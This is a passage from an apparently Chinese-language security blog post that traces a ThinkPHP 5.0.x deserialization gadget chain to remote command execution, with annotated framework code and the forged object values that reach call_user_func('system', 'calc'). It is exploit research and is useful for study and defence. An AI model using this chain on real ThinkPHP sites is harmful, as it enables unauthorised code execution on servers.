class="string">&#x27;HEXENS&lt;getAttr&gt;no&lt;&#x27;</span>, <span class="variable">$filters</span>)</span><br><span class="line">         └── <span class="variable">$default</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$filters</span>) → <span class="literal">null</span>                 <span class="comment">// ✅ 弹出 null，剩 [&#x27;system&#x27;]</span></span><br><span class="line">         └── <span class="keyword">foreach</span> (<span class="variable">$filters</span> <span class="keyword">as</span> <span class="variable">$filter</span>)</span><br><span class="line">              └── <span class="title function_ invoke__">is_callable</span>(<span class="variable">$filter</span>) = <span class="literal">true</span></span><br><span class="line">              └── <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$filter</span> = <span class="string">&#x27;system&#x27;</span>, <span class="variable">$value</span> = <span class="string">&#x27;calc&#x27;</span>)   <span class="comment">// ✅ 命令执行点</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<h3 id="调用链分析-1"><a href="#调用链分析-1" class="headerlink" title="调用链分析"></a>调用链分析</h3><p>首先调用链前半部分与 RCE1 相同，只不过 5.0.x 版本的 ThinkPHP 的没有 <code>think\model\concern\Conversion</code>  和 <code>think\model\concern\Attribute</code> 这两个 trait，也就是说 <code>think\model\Pivot</code> 的 <code>__toString</code> 等方法都是通过继承抽象类 <code>Model</code> 获得的。</p>
<p>因此调用链为：</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">think\process\pipes\Windows-&gt;<span class="title function_ invoke__">__destruct</span>()</span><br><span class="line">  └── think\process\pipes\Windows-&gt;<span class="title function_ invoke__">removeFiles</span>()</span><br><span class="line">      └── <span class="title function_ invoke__">file_exists</span>()</span><br><span class="line">          └── think\model\Pivot-&gt;<span class="title function_ invoke__">__toString</span>()</span><br><span class="line">              └── think\model\Pivot-&gt;<span class="title function_ invoke__">toJson</span>()</span><br><span class="line">                  └── think\model\Pivot-&gt;<span class="title function_ invoke__">toArray</span>()</span><br><span class="line">                      └── think\console\Output-&gt;<span class="title function_ invoke__">getAttr</span>()</span><br></pre></td></tr></table></figure></div>

<p><code>think\model\Pivot-&gt;toArray</code> 方法在 5.0.x 的实现和前面的 5.1.x 不同，并且绕过过程比较复杂。这个函数最终执行的效果就是调用到 <code>think\console\Output-&gt;getAttr</code> 方法。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 转换当前模型对象为数组</span></span><br><span class="line"><span class="comment">* <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$item</span>    = [];</span><br><span class="line">    <span class="variable">$visible</span> = [];</span><br><span class="line">    <span class="variable">$hidden</span>  = [];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// $this-&gt;data 和 $this-&gt;relation 均为空，因此 $data 也为空</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 过滤属性</span></span><br><span class="line">    <span class="comment">// 属性过滤（$this-&gt;visible 和 $this-&gt;hidden 都为空，因此不进入任何过滤分支）</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;visible)) &#123; </span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;hidden)) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历 $data 构建属性项（但 $data 为空，不进入循环）</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line">    <span class="comment">// $this-&gt;append = [&#x27;getError&#x27;]</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">            <span class="comment">// $this-&gt;append 的唯一一项的值为 &quot;getError&quot; 字符串</span></span><br><span class="line">            <span class="comment">// 即 $name = &quot;getError&quot;，进入常规字符串分支（不是数组，也不包含点号）</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                <span class="comment">// [...]</span></span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                <span class="comment">// [...]</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 统一为小驼峰（如 &#x27;getError&#x27; =&gt; &#x27;getError&#x27;，无变化）</span></span><br><span class="line">                <span class="variable">$relation</span> = <span class="title class_">Loader</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$name</span>, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// think\model\Pivot 继承了 Model 的 getError 方法，因此进入 if</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$relation</span>)) &#123; </span><br><span class="line">                    <span class="comment">// 调用 $this-&gt;getError 函数得到 $this-&gt;error</span></span><br><span class="line">                    <span class="comment">// 这里是一个 think\model\relation\HasOne 对象</span></span><br><span class="line">                    <span class="variable">$modelRelation</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$relation</span>();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 通过精确伪造 HasOne 和 Pivot 对象结构，使 getRelationData()</span></span><br><span class="line">                    <span class="comment">// 返回 $this-&gt;parent，即 think\console\Output 对象（为后续 __call 铺路）</span></span><br><span class="line">                    <span class="variable">$value</span>         = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationData</span>(<span class="variable">$modelRelation</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// HasOne 对象存在 getBindAttr 方法，进入 if</span></span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getBindAttr&#x27;</span>)) &#123;</span><br><span class="line">                        <span class="comment">// 调用 getBindAttr 方法返回 $modelRelation-&gt;bindAttr</span></span><br><span class="line">                        <span class="variable">$bindAttr</span> = <span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getBindAttr</span>();</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$bindAttr</span>) &#123;</span><br><span class="line">                            <span class="keyword">foreach</span> (<span class="variable">$bindAttr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$attr</span>) &#123;</span><br><span class="line">                                <span class="variable">$key</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>) ? <span class="variable">$attr</span> : <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">                                <span class="comment">// $this-&gt;data 为空，进入 else 分支</span></span><br><span class="line">                                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;data[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;bind attr has exists:&#x27;</span> . <span class="variable">$key</span>);</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    <span class="comment">// 在这里调用到 $value-&gt;getAttr 方法</span></span><br><span class="line">                                    <span class="comment">// $value 是 think\console\Output 对象，没有 getAttr 方法</span></span><br><span class="line">                                    <span class="comment">// 因此会调用到 think\console\Output-&gt;__Call 方法</span></span><br><span class="line">                                    <span class="comment">// 传入的参数 $attr 是 $bindAttr 数组中的值，即 &quot;no&quot; 字符串</span></span><br><span class="line">                                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$value</span> ? <span class="variable">$value</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$attr</span>) : <span class="literal">null</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$name</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> !<span class="keyword">empty</span>(<span class="variable">$item</span>) ? <span class="variable">$item</span> : [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>Model</code> 的 <code>getRelationData</code> 方法可以通过构造 <code>Pivot</code> 对象使其返回可控的 <code>Pivot-&gt;parent</code> 对象。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取关联模型数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> Relation        $modelRelation 模型关联对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> BadMethodCallException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelationData</span>(<span class="params">Relation <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 参数 $modelRelation 即 $this-&gt;error</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> &amp;&amp;  <span class="comment">// $this-&gt;parent 指向 Output 对象，不为空</span></span><br><span class="line">        <span class="comment">// $this-&gt;error 指向的 HasOne 的 selfRelation 为 false</span></span><br><span class="line">        !<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">isSelfRelation</span>() &amp;&amp; </span><br><span class="line">        <span class="comment">// $this-&gt;error-&gt;query-&gt;model 指向 Output 对象</span></span><br><span class="line">        <span class="comment">// 与 $this-&gt;parent 指向的对象的类相同</span></span><br><span class="line">        <span class="title function_ invoke__">get_class</span>(<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getModel</span>()) == <span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;<span class="built_in">parent</span>)) &#123; </span><br><span class="line">        <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span>; <span class="comment">// 返回 $this-&gt;parent</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通过伪造 &#96;&#96;Pivot-&gt;parent<code>指向的</code>think\console\Output<code> 对象（</code>styles<code>设置为</code>[“getAttr”]<code>），的 </code>Output-&gt;__call<code>方法可以形成如下调用链，最终会调用到</code>$this-&gt;handle-&gt;write&#96; 方法。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// method = &quot;getAttr&quot;, $args = [&quot;no&quot;]</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// $this 即 Pivot-&gt;parent (Output 对象) 的 styles 数组可控，这里设置为 [&quot;getAttr&quot;]</span></span><br><span class="line">    <span class="comment">// $method 是前面调用的不存在的方法 &quot;getAttr&quot;</span></span><br><span class="line">    <span class="comment">// 因此进入 if 判断</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="variable">$this</span>-&gt;styles)) &#123;</span><br><span class="line">        <span class="comment">// 将 $method 插入到 $args 数组第一项， 即 $args = [&quot;getAttr&quot;, &quot;no&quot;]</span></span><br><span class="line">        <span class="title function_ invoke__">array_unshift</span>(<span class="variable">$args</span>, <span class="variable">$method</span>);</span><br><span class="line">        <span class="comment">//调用 $this-&gt;block 方法，参数是 [&quot;getAttr&quot;, &quot;no&quot;]</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>([<span class="variable">$this</span>, <span class="string">&#x27;block&#x27;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $style = &quot;getAttr&quot;, $message = &quot;no&quot;</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">block</span>(<span class="params"><span class="variable">$style</span>, <span class="variable">$message</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">writeln</span>(<span class="string">&quot;&lt;<span class="subst">&#123;$style&#125;</span>&gt;<span class="subst">&#123;$message&#125;</span>&lt;/<span class="subst">$style</span>&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 输出信息并换行</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> string $messages = &quot;&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> int    $type = self::OUTPUT_NORMAL(0)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeln</span>(<span class="params"><span class="variable">$messages</span>, <span class="variable">$type</span> = <span class="built_in">self</span>::<span class="variable constant_">OUTPUT_NORMAL</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$messages</span>, <span class="literal">true</span>, <span class="variable">$type</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 输出信息</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $messages = &quot;&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bool   $newline = true</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> int    $type = self::OUTPUT_NORMAL(0)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$messages</span>, <span class="variable">$newline</span> = <span class="literal">false</span>, <span class="variable">$type</span> = <span class="built_in">self</span>::<span class="variable constant_">OUTPUT_NORMAL</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;handle-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$messages</span>, <span class="variable">$newline</span>, <span class="variable">$type</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>$this-&gt;handle</code> 被设置为 <code>think\session\driver\Memcached</code> 对象。而 <code>Memcached-&gt;write</code> 函数实现如下。其中 <code>Memcached-&gt;handler</code> 被设置为 <code>think\cache\driver\Memcache</code> 对象，因此会调用到 该对象的 <code>set</code> 方法。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">config = [</span><br><span class="line">    <span class="string">&quot;session_name&quot;</span> =&gt; <span class="string">&quot;HEXENS&quot;</span></span><br><span class="line">    <span class="string">&quot;expire&quot;</span> =&gt; <span class="number">3600</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 写入Session</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $sessID = &quot;&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> String $sessData = true</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$sessID</span>, <span class="variable">$sessData</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 参数为 &quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;, true, 3600</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">set</span>(<span class="variable">$this</span>-&gt;config[<span class="string">&#x27;session_name&#x27;</span>] . <span class="variable">$sessID</span>, <span class="variable">$sessData</span>, <span class="variable">$this</span>-&gt;config[<span class="string">&#x27;expire&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>think\cache\driver\Memcache</code> 对象中有如下调用链，最终调用到 <code>think\Request-&gt;get</code> 方法。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 写入缓存</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string            $name 缓存变量名 = &quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed             $value  存储数据 = true</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> integer|\DateTime $expire  有效时间（秒）= 3600</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// $expire 不为空，不进入判断</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$expire</span>)) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// $expire 是数字不是 DateTime 的实例，不进入判断</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$expire</span> <span class="keyword">instanceof</span> \DateTime) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;tag &amp;&amp; <span class="comment">// $this-&gt;tag 设置为 true</span></span><br><span class="line">        !<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">has</span>(<span class="variable">$name</span>)) &#123; <span class="comment">// 调用到 $this-&gt;has，参数为 &quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断缓存</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $name 缓存变量名 = &quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> bool</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">has</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// $this-&gt;getCacheKey 返回 $this-&gt;options[&#x27;prefix&#x27;] . $name</span></span><br><span class="line">    <span class="comment">// 其中 $this-&gt;options[&#x27;prefix&#x27;] 被设置为 &quot;&quot;</span></span><br><span class="line">    <span class="comment">// 因此 $key = $name = &quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span></span><br><span class="line">    <span class="variable">$key</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// $this-&gt;handler 被设置为 think\Request</span></span><br><span class="line">    <span class="comment">// 因此会调用 Request-&gt;get 方法，参数为 $key = &quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span> !== <span class="variable language_">$this</span>-&gt;handler-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>think\Request-&gt;get</code> 函数进一步会调用 <code>think\Request-&gt;input</code> 函数，并传入 <code>$this-&gt;get = [&#39;HEXENS&lt;getAttr&gt;no&lt;&#39; =&gt; &#39;calc&#39;]</code> 参数。</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 设置获取GET参数</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string|array $name    变量名 = &quot;HEXENS&lt;getAttr&gt;no&lt;/getAttr&gt;&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> mixed        $default 默认值 = null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string|array $filter  过滤方法 = &quot;&quot;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$default</span> = <span class="literal">null</span>, <span class="variable">$filter</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// $this-&gt;get = [&#x27;HEXENS&lt;getAttr&gt;no&lt;&#x27; =&gt; &#x27;calc&#x27;]，非空不进入判断</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;get)) &#123;</span><br><span class="line">        <span class="comment">// [...]</span></span><br><span 